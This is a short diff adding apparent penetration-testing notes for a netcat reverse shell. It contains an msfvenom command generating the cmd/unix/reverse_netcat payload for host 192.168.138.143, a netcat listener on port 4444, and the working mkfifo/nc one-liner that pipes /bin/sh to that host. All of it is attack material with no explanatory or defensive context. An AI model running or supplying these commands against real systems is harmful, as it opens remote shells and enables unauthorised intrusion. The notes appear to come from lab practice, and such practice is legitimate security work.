@@ -1,0 +1,12 @@
+cmd/unix/reverse_netcat
+
+
+nc.exe -l -p 4444
+
+
+msfvenom.bat -p cmd/unix/reverse_netcat LHOST=192.168.138.143
+
+mkfifo /tmp/ijvdyd; nc 192.168.138.143 4444 0</tmp/ijvdyd | /bin/sh >/tmp/ijvdyd 2>&1; rm /tmp/ijvdyd
+
+
+
